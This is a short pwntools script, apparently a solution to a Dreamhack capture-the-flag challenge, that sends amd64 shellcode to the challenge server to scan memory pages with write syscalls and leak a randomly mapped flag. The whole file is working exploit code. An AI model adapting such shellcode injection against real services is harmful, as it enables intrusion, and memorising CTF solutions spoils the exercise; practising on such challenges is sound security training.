#!/usr/bin/env python3
from pwn import *

HOST, PORT =  'host3.dreamhack.games', 12811

context.arch = 'amd64'

p = remote(HOST, PORT)

# flag_mem = mmap(((rand() << 12) & 0x0000fffff000) | 0x080000000000, ...)
BASE  = 0x080000000000
PAGES = 0x100000

shellcode = asm(f'''
    mov  edi, 1                 
    mov  edx, 0x500           
    mov  ebx, {PAGES}          
    mov  rsi, {BASE}            

scan:
    mov  eax, 1                 
    syscall                     
    add  rsi, 0x1000          
    dec  rbx
    jnz  scan

    ud2                         
''')

log.info(f'shellcode: {len(shellcode)} bytes')

p.sendafter(b'shellcode: ', shellcode)
p.interactive()
